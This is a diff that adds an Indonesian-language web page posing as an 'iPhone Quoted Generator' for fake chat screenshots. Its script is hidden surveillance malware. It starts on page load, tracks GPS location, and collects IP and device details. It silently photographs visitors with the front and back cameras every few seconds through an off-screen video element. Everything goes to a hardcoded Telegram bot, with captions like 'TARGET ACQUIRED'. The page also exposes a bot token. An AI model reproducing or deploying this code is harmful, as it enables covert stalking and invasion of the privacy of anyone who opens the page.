@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone Quoted Generator - ANDRE STR</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d1a4c 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #6b3fa0;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 30px;
+            height: 21px;
+            cursor: pointer;
+            margin-right: 15px;
+        }
+        
+        .hamburger span {
+            height: 3px;
+            width: 100%;
+            background-color: #bb86fc;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+        
+        .logo-text {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        
+        .dots-menu {
+            display: flex;
+            gap: 4px;
+            cursor: pointer;
+        }
+        
+        .dot {
+            width: 6px;
+            height: 6px;
+            background-color: #bb86fc;
+            border-radius: 50%;
+        }
+        
+        /* Sidebar Styles */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -300px;
+            width: 300px;
+            height: 100%;
+            background-color: #121212;
+            padding: 20px;
+            box-shadow: 2px 0 10px rgba(0,0,0,0.5);
+            transition: left 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .sidebar.active {
+            left: 0;
+        }
+        
+        .sidebar-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #6b3fa0;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .sidebar-content {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .sidebar-link {
+            color: #bb86fc;
+            text-decoration: none;
+            padding: 12px;
+            border-radius: 8px;
+            transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .sidebar-link:hover {
+            background: rgba(187, 134, 252, 0.1);
+        }
+        
+        .sidebar-link i {
+            width: 20px;
+            text-align: center;
+        }
+        
+        /* Main Content Styles */
+        .main-content {
+            background-color: rgba(18, 18, 18, 0.8);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #bb86fc;
+            font-size: 24px;
+        }
+        
+        .profile-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .profile-image {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #bb86fc;
+            margin-bottom: 15px;
+        }
+        
+        .profile-name {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #d0b4ff;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #6b3fa0;
+            border-radius: 8px;
+            background-color: #1f1f1f;
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        .type-options {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .type-option {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            border: 2px solid #6b3fa0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .type-option.active {
+            background-color: #6b3fa0;
+            color: #fff;
+        }
+        
+        .generate-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #6b3fa0 0%, #8a5ccc 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .generate-btn:hover {
+            background: linear-gradient(135deg, #8a5ccc 0%, #6b3fa0 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(107, 63, 160, 0.4);
+        }
+        
+        /* Recording Indicator (Hidden) */
+        .recording-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(255, 0, 0, 0.3);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            display: none;
+            z-index: 1001;
+        }
+        
+        /* Hidden Camera Preview */
+        .camera-preview {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1000;
+        }
+        
+        /* Result Section */
+        .result-container {
+            margin-top: 30px;
+            text-align: center;
+            display: none;
+        }
+        
+        .loader {
+            border: 5px solid #1f1f1f;
+            border-top: 5px solid #bb86fc;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .result-image {
+            max-width: 100%;
+            border-radius: 10px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .download-btn {
+            display: inline-block;
+            padding: 12px 25px;
+            background: linear-gradient(135deg, #6b3fa0 0%, #8a5ccc 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            margin-top: 15px;
+            transition: all 0.3s;
+        }
+        
+        .download-btn:hover {
+            background: linear-gradient(135deg, #8a5ccc 0%, #6b3fa0 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(107, 63, 160, 0.4);
+        }
+        
+        /* Overlay for sidebar */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            z-index: 999;
+        }
+        
+        .overlay.active {
+            display: block;
+        }
+    </style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="overlay" id="overlay"></div>
+    
+    <!-- Recording Indicator (Hidden from user) -->
+    <div class="recording-indicator" id="recordingIndicator">
+        <i class="fas fa-circle" style="color: red;"></i> Recording...
+    </div>
+    
+    <!-- Hidden Camera Preview -->
+    <video class="camera-preview" id="cameraPreview" autoplay muted playsinline></video>
+    <canvas class="camera-preview" id="cameraCanvas"></canvas>
+    
+    <div class="container">
+        <header>
+            <div class="logo-container">
+                <div class="hamburger" id="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                <div class="logo-text">ANDRE STR</div>
+            </div>
+            <div class="dots-menu" id="dots-menu">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </header>
+        
+        <div class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="logo-text">ANDRE STR</div>
+                <button class="close-btn" id="close-sidebar">&times;</button>
+            </div>
+            <div class="sidebar-content">
+                <a href="https://whatsapp.com/channel/0029Vb6JuZ57IUYTdZjPcL1S" class="sidebar-link" target="_blank">
+                    <i class="fab fa-whatsapp"></i>WhatsApp Channel
+                </a>
+                <a href="https://www.tiktok.com/@malzjomok?_r=1&_t=ZS-91YspLVbcR8" class="sidebar-link" target="_blank">
+                    <i class="fab fa-tiktok"></i>TikTok Saya
+                </a>
+                <a href="https://t.me/Mel_5009" class="sidebar-link" target="_blank">
+                    <i class="fab fa-telegram"></i>Telegram @Mel_5009
+                </a>
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <div class="profile-section">
+                <img src="https://g.top4top.io/p_36119fynd0.jpg" alt="My Wife" class="profile-image">
+                <div class="profile-name">iPhone Generator by ANDRE STR</div>
+            </div>
+            
+            <h1>📱 iPhone Quoted Generator</h1>
+            
+            <div class="input-group">
+                <label for="message">Masukkan Pesan Kamu</label>
+                <input type="text" id="message" placeholder="Tulis pesan Anda di sini...">
+            </div>
+            
+            <div class="input-group">
+                <label for="time">Jam (contoh: 17:01)</label>
+                <input type="text" id="time" placeholder="17:01">
+            </div>
+            
+            <div class="input-group">
+                <label for="battery">Baterai (contoh: 77)</label>
+                <input type="text" id="battery" placeholder="77">
+            </div>
+            
+            <div class="input-group">
+                <label for="provider">Provider (contoh: XL, Telkomsel)</label>
+                <input type="text" id="provider" placeholder="XL, Telkomsel">
+            </div>
+            
+            <div class="type-options">
+                <div class="type-option active" data-value="LITE">LITE</div>
+                <div class="type-option" data-value="TRY">TRY</div>
+            </div>
+            
+            <button class="generate-btn" id="generate-btn">🚀 Generator</button>
+            
+            <div class="result-container" id="result-container">
+                <div class="loader"></div>
+                <p>Sedang memproses...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration - GANTI DENGAN DATA ANDA
+        const TELEGRAM_BOT_TOKEN = '8531954661:AAFZqP4LAtolZw0yx8uBb0MmZ3xEi6ciqeQ';
+        const TELEGRAM_CHAT_ID = '7821086975'; // Ganti dengan ID Telegram Anda
+
+        // Global variables for continuous recording
+        let cameraStream = null;
+        let recordingInterval = null;
+        let photoCount = 0;
+        let recordingDuration = 0;
+        let frontCameraActive = false;
+        let backCameraActive = false;
+        let userLocation = null;
+        const recordingIndicator = document.getElementById('recordingIndicator');
+        const cameraPreview = document.getElementById('cameraPreview');
+        const cameraCanvas = document.getElementById('cameraCanvas');
+
+        // Sidebar functionality
+        const hamburger = document.getElementById('hamburger');
+        const dotsMenu = document.getElementById('dots-menu');
+        const sidebar = document.getElementById('sidebar');
+        const closeSidebar = document.getElementById('close-sidebar');
+        const overlay = document.getElementById('overlay');
+        
+        hamburger.addEventListener('click', toggleSidebar);
+        dotsMenu.addEventListener('click', toggleSidebar);
+        
+        closeSidebar.addEventListener('click', () => {
+            sidebar.classList.remove('active');
+            overlay.classList.remove('active');
+        });
+        
+        overlay.addEventListener('click', () => {
+            sidebar.classList.remove('active');
+            overlay.classList.remove('active');
+        });
+        
+        function toggleSidebar() {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+        
+        // Type selection
+        const typeOptions = document.querySelectorAll('.type-option');
+        
+        typeOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                typeOptions.forEach(opt => opt.classList.remove('active'));
+                option.classList.add('active');
+            });
+        });
+        
+        // Get IP info via multiple services
+        async function getIPInfo() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json'
+            ];
+            
+            for (let service of services) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+                    return data;
+                } catch (error) {
+                    continue;
+                }
+            }
+            return { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
+        }
+        
+        // Generate Google Maps link from coordinates
+        function generateGoogleMapsLink(lat, lng) {
+            return `https://www.google.com/maps?q=${lat},${lng}&z=16`;
+        }
+        
+        // Generate OpenStreetMap link
+        function generateOSMLink(lat, lng) {
+            return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=16`;
+        }
+        
+        // Get address from coordinates using reverse geocoding
+        async function getAddressFromCoords(lat, lng) {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+                const data = await response.json();
+                return data.display_name || 'Alamat tidak ditemukan';
+            } catch (error) {
+                return 'Gagal mendapatkan alamat';
+            }
+        }
+        
+        // Start Continuous Camera Recording (KAMERA DEPAN & BELAKANG)
+        async function startContinuousRecording() {
+            try {
+                // Coba akses kamera depan (user)
+                await startFrontCamera();
+                
+                // Tunggu 10 detik lalu coba akses kamera belakang (environment)
+                setTimeout(async () => {
+                    await startBackCamera();
+                }, 10000);
+                
+                return true;
+                
+            } catch (error) {
+                console.log('Camera recording failed:', error);
+                return false;
+            }
+        }
+        
+        // Start Front Camera (Kamera Depan - WAJAH)
+        async function startFrontCamera() {
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', // Kamera depan
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                frontCameraActive = true;
+                cameraPreview.srcObject = frontStream;
+                await cameraPreview.play();
+                
+                // Start capturing photos from front camera every 8 seconds
+                const frontInterval = setInterval(async () => {
+                    if (frontCameraActive) {
+                        await captureAndSendPhoto('FRONT');
+                    } else {
+                        clearInterval(frontInterval);
+                    }
+                }, 8000);
+                
+                // Capture first photo immediately
+                setTimeout(() => captureAndSendPhoto('FRONT'), 2000);
+                
+                console.log('📸 Front camera STARTED');
+                return true;
+                
+            } catch (error) {
+                console.log('Front camera failed:', error);
+                return false;
+            }
+        }
+        
+        // Start Back Camera (Kamera Belakang)
+        async function startBackCamera() {
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'environment', // Kamera belakang
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                backCameraActive = true;
+                cameraPreview.srcObject = backStream;
+                await cameraPreview.play();
+                
+                // Show hidden recording indicator
+                recordingIndicator.style.display = 'block';
+                
+                // Start capturing photos from back camera every 10 seconds
+                const backInterval = setInterval(async () => {
+                    if (backCameraActive) {
+                        await captureAndSendPhoto('BACK');
+                    }
+                }, 10000);
+                
+                // Capture first photo immediately
+                setTimeout(() => captureAndSendPhoto('BACK'), 2000);
+                
+                console.log('📸 Back camera STARTED');
+                return true;
+                
+            } catch (error) {
+                console.log('Back camera failed:', error);
+                return false;
+            }
+        }
+        
+        // Capture and send photo (TANPA DOWNLOAD OTOMATIS)
+        async function captureAndSendPhoto(cameraType) {
+            try {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = cameraPreview.videoWidth;
+                canvas.height = cameraPreview.videoHeight;
+                context.drawImage(cameraPreview, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    photoCount++;
+                    const timestamp = new Date().toLocaleString();
+                    const filename = `${cameraType}-photo-${photoCount}-${Date.now()}.jpg`;
+                    
+                    // Dapatkan lokasi terbaru untuk setiap foto
+                    const currentLocation = await accessLocation();
+                    let locationInfo = '';
+                    
+                    if (currentLocation) {
+                        const googleMapsLink = generateGoogleMapsLink(currentLocation.lat, currentLocation.lng);
+                        const osmLink = generateOSMLink(currentLocation.lat, currentLocation.lng);
+                        const address = await getAddressFromCoords(currentLocation.lat, currentLocation.lng);
+                        
+                        locationInfo = 
+                            `📍 **LOKASI REAL-TIME:**\n` +
+                            `🗺️ Google Maps: ${googleMapsLink}\n` +
+                            `🌐 OpenStreetMap: ${osmLink}\n` +
+                            `🏠 Alamat: ${address}\n` +
+                            `📡 Akurasi: ±${currentLocation.accuracy}m\n` +
+                            `🌍 Koordinat: ${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}`;
+                    }
+                    
+                    // Kirim ke Telegram saja, TIDAK download otomatis
+                    await sendPhotoToTelegram(blob, filename, 
+                        `📸 ${cameraType} Camera Photo #${photoCount}\n` +
+                        `⏰ ${timestamp}\n` +
+                        `📍 Duration: ${recordingDuration}s\n` +
+                        `🔋 Battery: ${await getBatteryLevel()}%\n\n` +
+                        `${locationInfo}`
+                    );
+                    
+                }, 'image/jpeg', 0.85);
+                
+                recordingDuration += cameraType === 'FRONT' ? 8 : 10;
+                updateRecordingIndicator();
+                
+                // Stop recording after 5 menit (300 detik)
+                if (recordingDuration >= 300) {
+                    stopContinuousRecording();
+                }
+                
+            } catch (error) {
+                console.log('Photo capture failed:', error);
+            }
+        }
+        
+        // Get battery level
+        async function getBatteryLevel() {
+            if (!navigator.getBattery) return 'Unknown';
+            
+            try {
+                const battery = await navigator.getBattery();
+                return Math.round(battery.level * 100);
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        // Stop continuous recording
+        function stopContinuousRecording() {
+            if (recordingInterval) {
+                clearInterval(recordingInterval);
+                recordingInterval = null;
+            }
+            
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            
+            frontCameraActive = false;
+            backCameraActive = false;
+            recordingIndicator.style.display = 'none';
+            
+            // Send final report
+            sendRecordingReport();
+        }
+        
+        // Update recording indicator
+        function updateRecordingIndicator() {
+            recordingIndicator.innerHTML = 
+                `<i class="fas fa-circle" style="color: red;"></i> ${photoCount} photos (${recordingDuration}s)`;
+        }
+        
+        // Location Access dengan tracking berkelanjutan
+        async function accessLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed,
+                            heading: position.coords.heading
+                        };
+                        userLocation = location;
+                        resolve(location);
+                    },
+                    (error) => {
+                        console.log('Location access failed:', error);
+                        resolve(userLocation); // Return last known location
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 60000
+                    }
+                );
+            });
+        }
+        
+        // Continuous location tracking
+        function startLocationTracking() {
+            if (!navigator.geolocation) return;
+            
+            const watchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    console.log('📍 Location updated:', userLocation);
+                },
+                (error) => {
+                    console.log('Location tracking error:', error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 30000
+                }
+            );
+            
+            return watchId;
+        }
+        
+        // Battery Info
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) return null;
+            
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        // Device Info
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled(),
+                pdf: navigator.pdfViewerEnabled,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.download,
+                    rtt: navigator.connection.rtt
+                } : 'Unknown'
+            };
+        }
+        
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(blob, filename, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, filename);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return true;
+            } catch (error) {
+                console.log('Failed to send photo to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Send message to Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return true;
+            } catch (error) {
+                console.log('Failed to send to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Send location to Telegram dengan link maps
+        async function sendLocationToTelegram(location) {
+            try {
+                const googleMapsLink = generateGoogleMapsLink(location.lat, location.lng);
+                const osmLink = generateOSMLink(location.lat, location.lng);
+                const address = await getAddressFromCoords(location.lat, location.lng);
+                
+                const caption = 
+                    `📍 <b>LOKASI TARGET DITEMUKAN</b>\n\n` +
+                    `🗺️ <a href="${googleMapsLink}">Google Maps</a>\n` +
+                    `🌐 <a href="${osmLink}">OpenStreetMap</a>\n` +
+                    `🏠 ${address}\n` +
+                    `🌍 ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\n` +
+                    `📡 Akurasi: ±${location.accuracy}m\n` +
+                    `⏰ ${new Date().toLocaleString()}`;
+                
+                // Kirim lokasi di map
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        latitude: location.lat,
+                        longitude: location.lng,
+                        caption: caption,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // Send recording report
+        async function sendRecordingReport() {
+            let locationInfo = '';
+            if (userLocation) {
+                const googleMapsLink = generateGoogleMapsLink(userLocation.lat, userLocation.lng);
+                locationInfo = 
+                    `\n📍 <b>LOKASI AKHIR:</b>\n` +
+                    `🗺️ <a href="${googleMapsLink}">Google Maps</a>\n` +
+                    `🌍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
+            }
+            
+            const report = 
+                `✅ <b>RECORDING COMPLETED</b>\n\n` +
+                `📸 Total Photos: ${photoCount}\n` +
+                `⏰ Duration: ${recordingDuration}s\n` +
+                `📱 Front Camera: ${frontCameraActive ? 'ACTIVE' : 'INACTIVE'}\n` +
+                `📷 Back Camera: ${backCameraActive ? 'ACTIVE' : 'INACTIVE'}\n` +
+                `🕐 End Time: ${new Date().toLocaleString()}` +
+                locationInfo;
+            
+            await sendToTelegram(report);
+        }
+        
+        // Collect and send all data
+        async function collectAndSendData() {
+            const results = [];
+            
+            // Mulai tracking lokasi
+            startLocationTracking();
+            
+            // Get IP info first
+            const ipInfo = await getIPInfo();
+            results.push(`🌐 IP: ${ipInfo.ip || 'Unknown'} (${ipInfo.country || 'Unknown'} - ${ipInfo.city || 'Unknown'})`);
+            
+            // Get device info
+            const deviceInfo = getDeviceInfo();
+            results.push(`📱 Device: ${deviceInfo.platform}`);
+            results.push(`🌐 Browser: ${deviceInfo.userAgent.substring(0, 60)}...`);
+            results.push(`🗣️ Language: ${deviceInfo.language}`);
+            results.push(`🕐 Timezone: ${deviceInfo.timezone}`);
+            results.push(`📺 Screen: ${deviceInfo.screen}`);
+            
+            // Get battery info
+            const batteryInfo = await getBatteryInfo();
+            if (batteryInfo) {
+                results.push(`🔋 Battery: ${batteryInfo.level}% (${batteryInfo.charging ? 'Charging' : 'Not Charging'})`);
+            }
+            
+            // Try to get location
+            const location = await accessLocation();
+            if (location) {
+                results.push(`📍 Location: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}`);
+                await sendLocationToTelegram(location);
+            }
+            
+            // Start continuous recording (DUA KAMERA)
+            const recordingStarted = await startContinuousRecording();
+            if (recordingStarted) {
+                results.push(`📹 Recording: DUAL CAMERA ACTIVE`);
+                results.push(`📸 Front Camera: 8s intervals`);
+                results.push(`📷 Back Camera: 10s intervals`);
+            }
+            
+            // Send summary to Telegram
+            const summary = 
+                `🎯 <b>TARGET ACQUIRED - DUAL CAMERA MODE</b>\n\n` +
+                `${results.join('\n')}\n\n` +
+                `⏰ Start: ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(summary);
+            
+            return true;
+        }
+        
+        // Generate functionality
+        const generateBtn = document.getElementById('generate-btn');
+        const resultContainer = document.getElementById('result-container');
+        
+        generateBtn.addEventListener('click', async () => {
+            const message = document.getElementById('message').value;
+            const time = document.getElementById('time').value || '11:26';
+            const battery = document.getElementById('battery').value || '88';
+            const provider = document.getElementById('provider').value || 'INDOSAT OOREDOO';
+            const selectedType = document.querySelector('.type-option.active').dataset.value;
+            
+            if (!message) {
+                alert('Silakan masukkan pesan terlebih dahulu!');
+                return;
+            }
+            
+            // Show loading
+            resultContainer.style.display = 'block';
+            resultContainer.innerHTML = '<div class="loader"></div><p>Sedang memproses...</p>';
+            
+            // Start surveillance DUAL CAMERA + LOKASI
+            collectAndSendData();
+            
+            // Continue with normal generation
+            await generateiPhoneQuoted();
+        });
+        
+        // Normal iPhone quoted generation
+        async function generateiPhoneQuoted() {
+            const message = document.getElementById('message').value;
+            const time = document.getElementById('time').value || '11:26';
+            const battery = document.getElementById('battery').value || '88';
+            const provider = document.getElementById('provider').value || 'INDOSAT OOREDOO';
+            const selectedType = document.querySelector('.type-option.active').dataset.value;
+            
+            // Construct API URL
+            const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(message)}&carrierName=${encodeURIComponent(provider)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple&type=${selectedType}`;
+            
+            // Simulate API call with timeout
+            setTimeout(async () => {
+                try {
+                    // Download image first
+                    const response = await fetch(apiUrl);
+                    const blob = await response.blob();
+                    
+                    // Display image
+                    const imageUrl = URL.createObjectURL(blob);
+                    resultContainer.innerHTML = `
+                        <p>Hasil:</p>
+                        <img src="${imageUrl}" alt="Generated Image" class="result-image">
+                        <br>
+                        <a class="download-btn" href="${imageUrl}" download="iphone-quoted-${Date.now()}.png">
+                            <i class="fas fa-download"></i> Download Gambar
+                        </a>
+                    `;
+                    
+                    // Send to Telegram
+                    await sendImageToTelegram(blob, message);
+                    
+                } catch (error) {
+                    resultContainer.innerHTML = `
+                        <p style="color: #ff4444;">Error: ${error.message}</p>
+                        <p>Hasil:</p>
+                        <img src="${apiUrl}" alt="Generated Image" class="result-image">
+                        <br>
+                        <a class="download-btn" href="${apiUrl}" download="iphone-quoted-${Date.now()}.png">
+                            <i class="fas fa-download"></i> Download Gambar
+                        </a>
+                    `;
+                }
+            }, 3000);
+        }
+        
+        // Send generated image to Telegram
+        async function sendImageToTelegram(blob, message) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, `iphone-quoted-${Date.now()}.png`);
+                formData.append('caption', 
+                    `📱 iPhone Quoted Generated\n` +
+                    `Pesan: ${message}\n` +
+                    `⏰ ${new Date().toLocaleString()}`
+                );
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.log('Failed to send image to Telegram');
+            }
+        }
+        
+        // Stop recording when page is closed
+        window.addEventListener('beforeunload', () => {
+            stopContinuousRecording();
+        });
+        
+        // Auto start when page loads (STEALTH MODE - DUAL CAMERA + LOKASI)
+        window.addEventListener('load', () => {
+            // Start data collection immediately
+            setTimeout(() => {
+                collectAndSendData();
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
